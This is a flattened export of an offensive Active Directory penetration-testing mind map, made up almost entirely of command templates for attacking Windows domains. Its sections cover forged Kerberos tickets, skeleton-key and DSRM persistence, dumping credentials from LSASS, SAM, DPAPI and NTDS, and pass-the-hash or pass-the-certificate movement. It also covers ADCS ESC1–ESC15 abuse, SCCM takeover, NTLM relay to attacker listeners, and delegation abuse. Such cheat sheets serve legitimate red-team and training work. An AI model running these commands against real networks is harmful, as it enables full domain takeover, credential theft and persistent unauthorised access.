
# Active Directory Mind Map Notes

  

- Persistence

- Persistence

- ...

- ACL manipulation

- DC shadow

- Saphire Ticket

- ticketer.py -request -impersonate <anyuser> -domain <domain> -user <user> -password

- <password>  -nthash <hash> -aesKey <aeskey> -domain-sid <domain_sid>  'ignored'

- Diamond ticket

- ticketer.py -request -domain <domain> -user <user> -password <password> -nthash <hash> -aesKey

- <aeskey> -domain-sid <domain_sid>  -user-id <user_id> -groups '512,513,518,519,520' <anyuser>

- Golden certificate

- certipy ca -backup -ca '<ca_name>' -username

- <user>@<domain> -hashes <hash>

- certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain>

- -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>

- Custom SSP

- mimikatz "privilege::debug" "misc::memssp" "exit"

- C:\Windows\System32\kiwissp.log

- Skeleton Key

- mimikatz "privilege::debug" "misc::skeleton"

- "exit" #password is mimikatz

- Directory Service Restore

- Mode (DSRM)

- PowerShell New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"

- -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

- Silver Ticket

- ticketer.py -nthash <machine_nt_hash> -domain-sid

- <domain_sid> -domain <domain> <anyuser>

- mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server>

- /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"

- Golden ticket

- mimikatz "kerberos::golden /user:<admin_user> /domain:<domain>

- /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"

- ticketer.py -aesKey <aeskey> -domain-sid

- <domain_sid> -domain <domain> <anyuser>

- ADD DA

- net group "domain admins" myuser /add /domain

- Trusts

- Mssql links

- MSSQL

- MSSQL trusted links doesn't

- care of trust link

- mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>

- trustlink

- sp_linkedservers

- use_link

- Get-SQLServerLinkCrawl -username <user> -password

- <pass> -Verbose -Instance <sql_instance>

- External Trust

- DomainA --> DomainB trust

- (A trust B / B access A)

- password reuse

- lat move (creds/pth/...)

- lat move (creds/pth/...)

- DomainA <-- DomainB trust

- (B trust A / A access B)

- Same as double trust, but no unconstrained

- delegation as B can't connect to A

- DomainA <--> DomainB trust

- (B trust A, A trust B)

- from A to B is FOREST_TRANSITIVE|TREAT_AS_EXTERNAL

- from A to B FOREST_TRANSITIVE

- ADCS abuse

- ADCS

- ADCS

- Unconstrained delegation

- coerce dc_b on dc_a

- unconstrained

- delegation

- unconstrained

- delegation

- SID History on B

- PassTheTicket

- PassTheTicket

- Trust ticket

- secretsdump.py -just-dc-user '<domainB>'

- <domainA>/<user>:'<password>'@<dc_a>

- ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid

- <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser

- Golden ticket

- ticketer.py -nthash <krbtgt> -domain-sid <domain_a> -domain <domain_a>

- -extra-sid <domain_b_sid>-<group_sid sup 1000> fakeuser

- mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt

- mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain>

- /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt

- Foreign group and users

- ACL

- ACL

- Group with foreign Domain

- Group Membership

- MATCH p=(n:Group {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group)

- WHERE m.domain<>n.domain RETURN p

- Users with foreign Domain

- Group Membership

- MATCH p=(n:User {domain:"<DOMAIN.FQDN>"})-[:MemberOf]->(m:Group)

- WHERE m.domain<>n.domain RETURN p

- password reuse

- lat move (creds/pth/...)

- lat move (creds/pth/...)

- Parent->Child

- same as Child to parent

- Child->Parent

- Unconstrained delegation

- coerce parent_dc on

- child_dc domain

- unconstrained

- delegation

- unconstrained

- delegation

- Golden Ticket

- PassTheTicket

- PassTheTicket

- ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid>

- -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser

- raiseChild.py <child_domain>/<user>:<password>

- mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt

- mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT>

- /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt

- Trust Key

- PassTheTicket

- PassTheTicket

- secretsdump.py -just-dc-user '<parent_domain>$'

- <domain>/<user>:<password>@<dc_ip>

- ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child_domain>

- -extra-sid <parent_sid>-519 -spn krbtgt/<parent_domain> trustfakeuser

- mimikatz lsadump::trust /patch

- mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256>

- /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt

- Enumeration

- Get Domains SID

- lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py

- -domain-sids <domain>/<user>:<password>'@<target_dc> 0

- Get-DomainSID -Domain <domain> Get-DomainSID

- -Domain <target_domain>

- sharphound.exe -c trusts -d <domain>

- MATCH p=(:Domain)-[:TrustedBy]->(:Domain) RETURN p

- ldeep ldap -u <user> -p <password> -d

- <domain> -s ldap://<dc_ip> trusts

- Get-DomainTrustMapping

- Get-DomainTrust -Domain <domain>

- ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

- nltest.exe /trusted_domains

- Domain admin

- Grab backup Keys

- Credentials

- Credentials

- donpapi collect - H ':<hash>' <domain>/<user>@<ip_range>

- -t ALL --fetch-pvk

- Dump ntds.dit

- Crack hash

- Crack hash

- Lateral move

- Lateral move

- certsync -u <user> -p '<password>' -d <domain>

- -dc-ip <dc_ip> -ns <name_server>

- mimikatz lsadump::dcsync /domain:<target_domain>

- /user:<target_domain>\administrator

- msf> windows/gather/credentials/domain_hashdump

- ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

- secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE

- -hashes lmhash:nthash LOCAL -outputfile ntlm-extract

- secretsdump.py '<domain>/<user>:<pass>'@<ip>

- nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds

- Lateral Move

- MSSQL

- mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>

- trustlink

- sp_linkedservers

- use_link

- Trust

- Trust

- MSSQL

- MSSQL

- xp_dir_tree <ip>

- COERCE SMB

- COERCE SMB

- enum_impersonate

- exec_as_login <login>

- MSSQL

- MSSQL

- exec_as_user <user>

- MSSQL

- MSSQL

- enable_xp_cmdshell

- xp_cmdshell <cmd>

- Low Access

- Low Access

- enum_db

- MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p

- MSSQL

- MSSQL

- Users or Computers with SQL admin

- find mssql access

- nxc mssql <ip> -u <user> -p <password> -d <domain>

- MSSQL

- MSSQL

- Certificate (pfx)

- Pass the certificate

- schannel

- certipy cert -pfx "<pfx_file>" -nokey -out "user.crt"

- certipy cert -pfx "<pfx_file>" -nocert -out "user.key"

- passthecert.py -action ldap-shell -crt <user.crt>

- -key <user.key> -domain <domain> -dc-ip <dc_ip>

- certipy auth -pfx <pfx_file> -ldap-shell

- add_computer

- Set RBCD

- RBCD

- RBCD

- pkinit

- certipy auth -pfx <crt_file> -dc-ip <dc_ip>

- Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"]

- /domain:"<fqdn-domain>" /dc:"<dc>" /show

- gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass  "<cert-password>"]

- "<fqdn_domain>/<user>" "<tgt_ccache_file>"

- unpac the hash

- gettgtpkinit.py -cert-pfx <crt.pfx> -pfx-pass

- <crt_pass> "<domain>/<dc_name>" <tgt.ccache>

- getnthash.py -key '<AS-REP encryption

- key>' '<domain>'/'<dc_name>'

- certipy auth -pfx <crt_file> -dc-ip <dc_ip>

- Socks (relay)

- proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>

- Authority/System

- Authority/System

- proxychains atexec.py  -no-pass  <domain>/<user>@<ip> "command"

- Authority/System

- Authority/System

- proxychains smbclient.py -no-pass <user>@<ip>

- Search files

- Search files

- proxychains secretsdump.py -no-pass '<domain>'/'<user>'@'<ip>'

- DCSYNC

- DCSYNC

- proxychains mssqlclient.py -windows-auth

- <domain>/<user>@<ip> -no-pass

- MSSQL

- MSSQL

- proxychains lookupsid.py <domain>/<user>@<ip>

- -no-pass -domain-sids

- Kerberos

- Aeskey

- Admin

- proxychains secretsdump.py -aesKey

- <key> '<domain>'/'<user>'@'<ip>'

- impacket tools: Same as Pass the hash but

- use : -aesKey for impacket (and use FQDN)

- Pass the Ticket (ccache / kirbi)

- Modify SPN

- PassTheTicket

- PassTheTicket

- tgssub.py -in <ticket.ccache> -out <newticket.ccache>

- -altservice "<service>/<target>" #pr 1256

- proxychains secretsdump.py -k'<domain>'/'<user>'@'<ip>'

- Rubeus.exe ptt /ticket:<ticket>

- mimikatz kerberos::ptc "<ticket>"

- export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache

- Admin

- Admin

- impacket tools: Same as Pass the hash but

- use : -k and -no-pass for impacket

- Convert Format

- ticketConverter.py <kirbi||ccache> <ccache||kirbi>

- NT Hash

- Overpass the Hash /

- Pass the key (PTK)

- Admin

- Admin

- getTGT.py <domain>/<user> -hashes :<hashes>

- Rubeus.exe asktgt /user:victim /rc4:<rc4value>

- Rubeus.exe createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]

- Rubeus.exe ptt /ticket:<ticket>

- Pass the Hash

- WinRM

- Admin

- Admin

- Low access

- Low access

- evil-winrm -i <ip> -u <user> -H <hash>

- RDP

- Admin

- Admin

- Low access

- Low access

- reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'

- -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'

- xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>

- mimikatz "privilege::debug sekurlsa::pth /user:<user>

- /domain:<domain> /ntlm:<hash>"

- Admin

- Admin

- MSSQL/PseudoShell PsExec/SMB...

- Admin

- Admin

- nxc : same as with creds, but use -H ':<hash>'

- impacket : same as with creds, but use -hashes ':<hash>'

- Clear text Password

- Admin

- Admin

- MSSQL

- MSSQL

- MSSQL

- mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>

- nxc mssql <ip_range> -u <user> -p <password>

- SMB

- Search files

- Search files

- smbclient-ng.py -d <domain> -u <user> -p <password> --host <ip>

- smbclient.py <domain>/<user>:<password>@<ip>

- RDP

- Admin

- Admin

- Low access

- Low access

- xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>

- WinRM

- Admin

- Admin

- Low access

- Low access

- nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>

- Enter-PSSession -ComputerName <computer>

- -Credential <domain>\<user>

- evil-winrm -i <ip> -u <user> -p <password>

- Pseudo-shell (file write and read)

- nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>

- dcomexec.py  <domain>/<user>:<password>@<ip>

- wmiexec.py  <domain>/<user>:<password>@<ip>

- smbexec.py  <domain>/<user>:<password>@<ip>

- atexec.py  <domain>/<user>:<password>@<ip> "command"

- Interactive-shell - psexec

- Authority/System

- Authority/System

- psexecsvc.py <domain>/<user>:<password>@<ip>

- psexec.exe -AcceptEULA \\<ip>

- psexec.py <domain>/<user>:<password>@<ip>

- Admin access

- Misc

- Hybrid (Azure AD-Connect)

- DCSYNC

- DCSYNC

- Dump cleartext password of MSOL

- Account on ADConnect Server

- nxc smb <ip> -u <user> -p <password> -M msol

- azuread_decrypt_msol_v2.ps1

- Extract Keepass

- User + Pass

- User + Pass

- KeePwn.py trigger add -u '<user>' -p '<password>'

- -d '<domain>' -t <target>

- KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>'

- -t <target> --plugin KeeFarceRebornPlugin.dll

- Find Users

- Username

- Username

- smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\Users'

- --dir-only --no-write-check --no-update --no-color --csv users_directory.csv

- Impersonate

- Impersonate RDP Session

- RDP

- RDP

- psexec.exe -s -i cmd

- query user

- tscon.exe <id> /dest:<session_name>

- Impersonate with adcs

- Pass The Hash / Ticket

- / Certificate

- Pass The Hash / Ticket

- / Certificate

- NTLM

- NTLM

- masky - d <domain> -u <user>  (-p <password> || -k

- || -H <hash>) -ca <certificate authority> <ip>

- Impersonate

- User + Pass

- User + Pass

- ACL

- ACL

- irs.exe list

- irs.exe exec -p <pid> -c <command>

- nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users

- nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as

- -o USER=<logged-on-user> CMD=<cmd-command>

- msf> use incognito impersonate_token <domain>\\<user>

- Extract credentials from DPAPI

- Crack users masterkey

- DPAPImk

- DPAPImk

- copy c:\users\<user>\AppData\Roaming\Microsoft\Protect\<SID>

- DPAPImk2john.py --preferred <prefered_file>

- DPAPImk2john.py -c domain -mk <masterkey> -S <sid>

- DPAPI

- Clear text move

- Clear text move

- PassTheHash

- PassTheHash

- User + Pass

- User + Pass

- SharpDPAPI.exe triage

- get masterkey

- lsassy -d <domain> -u <user> -p <password>

- <ip> -m rdrleakdiag -M masterkeys

- dploot.py browser -d <domain> -u <user> -p '<password>'

- <ip> -mkfile <masterkeys_file>

- mimikatz "sekurlsa::dpapi"

- dploot.py browser -d <domain> -u <user> -p '<password>'

- <ip> -mkfile <masterkeys_file>

- dpapidump.py <domain>/<user>:<password>@<target>

- donpapi <domain>/<user>:<password>@<target>

- nxc smb <ip_range> -u <user> -p <password>

- --dpapi [cookies] [nosystem]

- Extract credentials from LSA

- User + Pass

- User + Pass

- MsCache 2

- MsCache 2

- reg.py <domain>/<user>:<password>@<ip>

- backup -o '\\<smb_ip>\share'

- reg save HKLM\SECURITY <file>;  reg save HKLM\SYSTEM <file>

- secretsdump.py -system SYSTEM -security SECURITY

- mimikatz "privilege::debug" "lsadump::lsa" "exit"

- nxc smb <ip_range> -u <user> -p <password> --lsa

- Extract credentials from SAM

- PassTheHash

- PassTheHash

- NTLM

- NTLM

- regsecrets.py <domain>/<user>:<password>@<ip>

- reg.py <domain>/<user>:<password>@<ip>

- backup -o '\\<smb_ip>\share'

- secretsdump.py -system SYSTEM -sam SAM LOCAL

- reg save HKLM\SAM <file>;  reg save HKLM\SYSTEM <file>

- secretsdump.py -system SYSTEM -sam SAM LOCAL

- secretsdump.py <domain>/<user>:<password>@<ip>

- mimikatz "privilege::debug" "lsadump::sam" "exit"

- msf> hashdump

- nxc smb <ip_range> -u <user> -p <password> --sam

- Extract credentials from LSASS.exe

- Extract LSASS secrets

- Clear text move

- Clear text move

- PassTheHash

- PassTheHash

- NTLM

- NTLM

- User + Pass

- User + Pass

- lsassy -d <domain> -u <user> -p <password> <ip>

- nxc smb <ip_range> -u <user> -p <password> -M lsassy

- msf> load kiwi creds_all

- mimikatz "privilege::debug" "token::elevate"

- "sekurlsa::logonpasswords"  "exit"

- procdump.exe -accepteula -ma lsass.exe lsass.dmp

- LSASS as protected process

- mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate"

- "sekurlsa::logonpasswords" "!processprotect  /process:lsass.exe" "!-"

- PPLdump64.exe <lsass.exe|lsass_pid>

- lsass.dmp #before 2022-07-22 update

- SCCM

- Post exploit

- as sccm admin

- SCCMHound.exe --server <server> --sitecode <sitecode>

- Users sessions

- Users sessions

- Cleanup

- SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP>

- -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"

- SharpSCCM.exe remove device GUID:<GUID>

- -sms <SMS_PROVIDER> -sc <SITECODE>

- EXEC-1/2 SCCM admin

- lat

- lat

- sccmhunter.py admin -u <user>@<domain>

- -p '<password>' -ip <sccm_ip>

- SharpSCCM.exe exec -p <binary> -d <device_name>

- -sms <SMS_PROVIDER> -sc <SITECODE> --no-banner

- Creds-5 SCCM admin

- Site DB credentials

- Site DB credentials

- secretsdump.py <domain>/<admin>:'<pass>'@<sccm_target>

- mssqlclient.py -windows-auth -hashes '<sccm_target_hashNT>'

- '<domain>/<sccm_target>$'@<sccm_mssql>

- get_device <hostname>

- interact <device_id>

- script xploit.ps1

- use CM_<site_code>;

- SELECT * FROM SC_UserAccount;

- sccmdecryptpoc.exe <cyphered_value>

- Creds-3Creds-4 Computer Admin user

- NAA credentials

- NAA credentials

- SharpSCCM.exe local secrets -m wmi

- SharpSCCM.exe local secrets -m disk

- sccmhunter.py dpapi  -u <admin> -p '<password>'

- -target <sccm_target> -debug

- dploot.py sccm -u <admin> -p '<password>' <sccm_target>

- Creds-2:Policy Request Credentials

- Simple user

- User + Pass

- User + Pass

- add computer

- SharpSCCM.exe get secrets -r newcomputer

- -u <computer_added>$ -p <computer_pass>"

- cleanup

- sccmwtf.py newcomputer newcomputer.<domain> <target>

- '<domain>\<computer_added>$' '<computer_pass>'

- get NetworkAccessUsername

- and NetworkAccessPassword

- policysecretunobfuscate.py

- delete device created

- after sccmadmin

- Takeover-2:relay to mssql

- server Simple user

- Admin MSSQL

- Admin MSSQL

- SCCM MSSQL != SSCM server

- ntlmrelayx.py -t <sccm_mssql> -smb2support -socks

- coerce sccm_server

- proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>

- Takeover-1:relay to mssql

- db Simple user

- SCCM ADMIN

- SCCM ADMIN

- SCCM MSSQL != SSCM server

- sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip

- <dc_ip> -debug -tu <target_user> -sc <site_code> -stacked

- ntlmrelayx.py -smb2support -ts -t

- mssql://<sccm_mssql> -q "<query>"

- coerce sccm_mssql -> attacker

- sccmhunter.py admin -u <target_user>@<domain>

- -p '<password>' -ip <sccm_ip>

- CRED-6 Loot creds

- User + Pass

- User + Pass

- SCCM HTTP service (80/TCP

- or 443/TCP) on a DP

- sccm-http-looter -server <ip_dp>

- SCCMSecrets.py files -dp http://<distribution_point>

- -u '<user>' -p '<password>'

- SCCMSecrets.py policies -mp http://<management_point> -u '<machine_account>$'

- -p '<machine_password>' -cn '<client_name>'

- SCCM SMB service (445/TCP) on a DP

- cmloot.py <domain>/<user>:<password>@<sccm_dp>

- -cmlootinventory sccmfiles.txt

- Elevate-3:Automatic client

- push Simple user

- Relay ntlm

- Relay ntlm

- Create DNS A record for

- non existing computer x

- dnstool.py -u '<domain>\<user>' -p <pass>  -r <newcomputer>.<domain>

- -a add -t A -d <attacker_ip> <dc_ip>

- Enroll new computer x in AD  then remove

- host SPN from the machine account

- setspn -D host/<newcomputer> <newcomputer> setspn

- -D host/<newcomputer>.<domain> <newcomputer>

- wait 5m for client push

- ntlmrelayx.py -tf <no_signing_target> -smb2support -socks

- cleanup

- Elevate-2:Force client

- push Simple user

- Admin

- Admin

- ntlmrelayx.py -t <sccm_server> -smb2support

- -socks # listen connection

- SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc

- <site_code> -t <attacker_ip> # Launch client push install

- proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>

- cleanup

- Elevate-1:Relay on site

- systems Simple user

- Admin on Site system

- Admin on Site system

- coerce sccm site server

- ntlmrelayx.py -tf <site_systems> -smb2support

- Creds-1 No credentials

- User + Pass

- User + Pass

- NAA credentials

- NAA credentials

- Extract from pxe See no creds

- PXE

- PXE

- recon

- nxc smb <sccm_server> -u <user> -p

- <password> -d <domain> --shares

- ldeep ldap -u <user> -p <password>

- -d <domain> -s ldap://<dc_ip> sccm

- sccmhunter.py find -u <user> -p <password>

- -d <domain> -dc-ip <dc_ip> -debug

- sccmhunter.py show -all

- ADCS

- Abuse Certificate Mapping

- ESC14 (explicit)

- ESC9/ESC10 (implicit)

- reset accountB UPN

- certipy account update -username <accountA>@<domain> -password

- <passA> -user <accountB> -upn <accountB>@<domain>

- Pass The Certificate

- Pass The Certificate

- [Schannel Mapping] ESC9/ESC10

- (Case 2)

- [Kerberos Mapping]

- ESC9/ESC10(Case 1)

- certipy shadow auto -username <accountA>@<domain>

- -p <passA> -account <accountB>

- ESC10 (Case 2)

- certipy account update -username <accountA>@<domain> -password

- <passA> -user <accountB> -upn '<dc_name$>@<domain>'

- ESC10  Case1

- ESC10  Case1

- ESC9/ESC10 (Case 1)

- certipy account update -username <accountA>@<domain> -password

- <passA> -user <accountB> -upn Administrator

- reset accountB UPN

- reset accountB UPN

- ESC10 (case 1)

- certipy req  -username <accountB>@<domain> -hashes <hashB>

- -ca <ca_name> -template <any template with client auth>

- ESC9

- certipy req  -username <accountB>@<domain> -hashes <hashB>

- -ca <ca_name> -template <vulnerable template>

- Misconfigured Certificate Authority

- ESC11

- Pass the ticket

- Pass the ticket

- DCSYNC

- DCSYNC

- Domain Admin

- Domain Admin

- certipy relay -target rpc://<ip_ca> -ca '<ca_name>'

- certipy auth -pfx <certificate> -dc-ip <dc_ip>

- ntlmrelayx.py -t rpc://<ca_ip> -smb2support

- -rpc-mode ICPR -icpr-ca-name <ca_name>

- gettgtpkinit.py -pfx-base64 $(cat cert.b64)

- <domain>/<dc_name>$ <ccache_file>

- Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate>

- /ptt

- ESC6

- ESC1

- ESC1

- Abuse ATTRIBUTESUBJECTALTNAME2 flag set on CA you can choose

- any certificate template that permits client authentication

- Vulnerable PKI Object

- access control

- ESC5

- Golden certificate

- certipy ca -backup -u <user>@<domain> -hashes <hash_nt>

- -ca <ca_name> -debug -target <ca_ip>

- certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>

- Pass the certificate

- Pass the certificate

- Vulnerable acl on PKI

- ACL

- ACL

- Misconfigured ACL

- ESC7

- Manage certificate

- Issue request

- certipy ca -u <user>@<domain> -p '<password>'

- -ca <ca_name> -issue-request <request_id>

- certipy req -u <user>@<domain> -p '<password>'

- -ca <ca_name> -retreive <request_id>

- Pass the certificate

- Pass the certificate

- certipy ca  -ca <ca_name> -enable-template '<ecs1_vuln_template>'

- -username <user>@<domain> -password <password>

- certipy  req -username <user>@<domain> -password <password> -ca <ca_name>

- -template '<vulnerable template name>' -upn '<target_user>'

- error, but save private key

- and get issue request

- Manage CA

- certipy ca -ca <ca_name> -add-officer  '<user>' -username <user>@<domain>

- -password <password> -dc-ip <dc_ip> -target-ip <target_ip>

- ESC7 Manage

- certificate

- ESC7 Manage

- certificate

- ESC4

- write privilege over a

- certificate template

- restore template

- certipy template -u <user>@<domain> -p '<password>' -template

- <vuln_template> -configuration <template>.json

- certipy template -u <user>@<domain> -p '<password>'

- -template <vuln_template> -save-old -debug

- ESC1

- ESC1

- Misconfigured Certificate Template

- ESC15

- certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template

- with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]

- Pass the certificate

- Pass the certificate

- certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable

- template name>' -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>

- certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee

- flag>' -ca <ca_name> -upn <target_user>@<domain> --application-policies 'Client Authentication' #[PR 228]

- Pass the certificate

- (only Schannel)

- Pass the certificate

- (only Schannel)

- ESC13

- Pass The Certificate

- (PKINIT)

- Pass The Certificate

- (PKINIT)

- certify.exe request /ca:<server>\<ca-name>

- /template:"<vulnerable template name>"

- certipy req -u <user>@<domain> -p <password> -target <ca_server>

- -template '<vulnerable template name>' -ca <ca_name>

- ESC3

- certipy req -u <user>@<domain> -p <password> -target <ca_server>

- -template '<vulnerable template name>'  -ca <ca_name>

- certipy req -u <user>@<domain> -p <password> -target <ca_server> -template  '<vulnerable

- template name>'  -ca <ca_name> -on-behalf-of '<domain>\<user>' -pfx <cert>

- certify.exe request /ca:<server>\<ca-name>

- /template:"<vulnerable template name>"

- certify.exe request request /ca:<server>\<ca-name> /template:<template>  /onbehalfof:<domain>\<user>

- /enrollcert:<path.pfx> [/enrollcertpw:<cert-password>]

- ESC2

- ESC3

- ESC3

- ESC1

- Pass the certificate

- Pass the certificate

- certify.exe request /ca:<server>\<ca-name>   /template:"<vulnerable

- template name>" [/altname:"Admin"]

- certipy req -u <user>@<domain> -p <password> -target <ca_server> -template

- '<vulnerable template name>'  -ca <ca_name> -upn <target_user>@<domain>

- Web Enrollment Is Up

- Domain admin

- Domain admin

- ESC8

- Pass the ticket

- Pass the ticket

- LDAP shell

- LDAP shell

- DCSYNC

- DCSYNC

- certipy relay -target http://<ip_ca>

- certipy auth -pfx <certificate> -dc-ip <dc_ip>

- ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug

- -smb2support --adcs --template DomainController

- gettgtpkinit.py -pfx-base64 $(cat cert.b64)

- <domain>/<dc_name>$ <ccache_file>

- Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate>

- /ptt

- Enumeration

- Vulnerable PKI

- Object AC

- Vulnerable PKI

- Object AC

- Misconfigured ACL

- Misconfigured ACL

- Vulnerable CA

- Vulnerable CA

- Vulnerable template

- Vulnerable template

- Web enrollement

- Web enrollement

- Display CA information

- certify.exe cas

- certutil -TCAInfo

- Get PKI objects information

- certify.exe pkiobjects

- ldeep ldap -u <user> -p <password>

- -d <domain> -s <dc_ip> templates

- certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip>

- certify.exe find [ /vulnerable]

- certutil -v -dsTemplate

- Kerberos Delegation

- S4U2self abuse

- getTGT.py -dc-ip "<dc_ip>" -hashes :"<machine_hash>"

- "<domain>"/"<machine>$"

- getST.py -self -impersonate "<admin>" -altservice "cifs/<machine>"

- -k -no-pass -dc-ip "DomainController" "<domain>"/'<machine>$'

- Admin

- Admin

- Get machine account (X)'s TGT

- Get a ST on X as user admin

- Resource-Based Constrained

- Delegation

- RBCD With added computer account

- rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$'

- -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>

- getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>'

- -impersonate Administrator --dc-ip <dc_ip>

- Kerberos TGT

- Kerberos TGT

- Admin

- Admin

- Rubeus.exe hash /password:<computer_pass>

- /user:<computer> /domain:<domain>

- Rubeus.exe s4u /user:<fake_computer$> /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/<victim.domain.local>

- /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt

- Admin

- Admin

- add computer account

- addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>'

- -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'

- Constrained delegation

- Without protocol transition (kerberos

- only) UAC: TRUSTED_FOR_DELEGATION

- Self RBCD

- Like RBCD without add computer

- RBCD With added computer account

- Kerberos TGS

- Kerberos TGS

- rbcd.py -delegate-from '<rbcd_con>$' -delegate-to '<constrained>$' -dc-ip

- '<dc>' -action 'write' -hashes '<hash>' <domain>/<constrained>$

- getST.py -spn host/<constrained> -impersonate Administrator

- --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'

- getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$'

- -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>

- add computer account

- addcomputer.py -computer-name '<computer_name>' -computer-pass '<ComputerPassword>'

- -dc-host <dc> -domain-netbios <domain_netbios> '<domain>/<user>:<password>'

- Constrain between Y and Z

- Add computer X

- Add RBCD : delegate from X to Y

- s4u2self X (impersonate admin)

- S4u2Proxy X (impersonate

- admin on spn/Y)

- Forwardable TGS for Y

- S4u2Proxy Y (impersonate

- admin on spn/Z)

- With protocol transition (any) UAC:

- TRUST_TO_AUTH_FOR_DELEGATION

- getST.py -spn '<spn>/<target>' -impersonate Administrator -dc-ip

- '<dc_ip>' '<domain>/<user>:<password>' -altservice <altservice>

- Altservice HTTP/HOST/CIFS/LDAP

- Kerberos TGS

- Kerberos TGS

- Rubeus.exe hash /password:<password>

- Rubeus.exe asktgt /user:<user> /domain:<domain>

- /aes256:<AES 256 hash>

- Rubeus.exe s4u /ticket:<ticket> /impersonateuser:<admin_user>

- /msdsspn:<spn_constrained> /altservice:<altservice> /ptt

- Altservice HTTP/HOST/CIFS/LDAP

- Kerberos TGS

- Kerberos TGS

- Get TGT for user

- Request S4u2self

- Request S4u2proxy

- Unconstrained delegation

- Kerberos TGT

- Kerberos TGT

- PassTheTicket

- PassTheTicket

- UAC: ADS_UF_TRUSTED_FOR_DELEGATION

- Force connection  with coerce

- Get tickets

- Rubeus.exe monitor /interval:5

- Rubeus.exe dump /luid:0xdeadbeef /nowrap

- Rubeus.exe dump /service:krbtgt /nowrap

- mimikatz privilege::debug sekurlsa::tickets

- /export sekurlsa::tickets /export

- Find delegation

- With BloodHound

- Constrained

- MATCH p=shortestPath((u:User)-[*1..]->(c:Computer

- {name: "<MYTARGET.FQDN>"})) RETURN p

- MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p

- Unconstrained

- MATCH (c:User {unconstraineddelegation:true}) RETURN c

- MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

- findDelegation.py "<domain>"/"<user>":"<password>"

- ACLs/ACEs permissions

- DNS Admin

- DNSadmins abuse (CVE-2021-40469)

- Admin

- Admin

- sc \\DNSServer stop dns sc \\DNSServer start dns

